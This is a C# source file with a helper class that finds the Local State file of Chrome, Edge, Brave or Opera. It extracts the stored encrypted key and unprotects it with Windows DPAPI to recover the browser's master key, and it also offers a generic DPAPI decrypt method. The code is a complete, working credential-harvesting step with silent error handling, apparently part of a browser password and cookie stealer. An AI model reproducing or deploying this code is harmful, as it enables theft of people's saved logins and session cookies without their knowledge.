using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Newtonsoft.Json.Linq;

namespace True.Helpers
{
    public static class DPAPIHelper
    {
        public static string Decrypt(byte[] encryptedData)
        {
            try
            {
                if (encryptedData == null || encryptedData.Length == 0)
                    return null;

                byte[] decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(decryptedData);
            }
            catch
            {
                return null;
            }
        }

        public static byte[] GetMasterKey(string browserName)
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string statePath = browserName switch
                {
                    "Chrome" => Path.Combine(localAppData, @"Google\Chrome\User Data\Local State"),
                    "Edge" => Path.Combine(localAppData, @"Microsoft\Edge\User Data\Local State"),
                    "Brave" => Path.Combine(localAppData, @"BraveSoftware\Brave-Browser\User Data\Local State"),
                    "Opera" => Path.Combine(localAppData, @"Opera Software\Opera Stable\Local State"),
                    _ => null
                };

                if (statePath == null || !File.Exists(statePath))
                    return null;

                string stateText = File.ReadAllText(statePath);
                var json = JObject.Parse(stateText);
                string encryptedKeyB64 = json["os_crypt"]?["encrypted_key"]?.ToString();

                if (string.IsNullOrEmpty(encryptedKeyB64))
                    return null;

                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyB64);

                // Trim "DPAPI" prefix (5 bytes)
                byte[] keyWithoutHeader = encryptedKey[5..];

                return ProtectedData.Unprotect(keyWithoutHeader, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }
    }
}
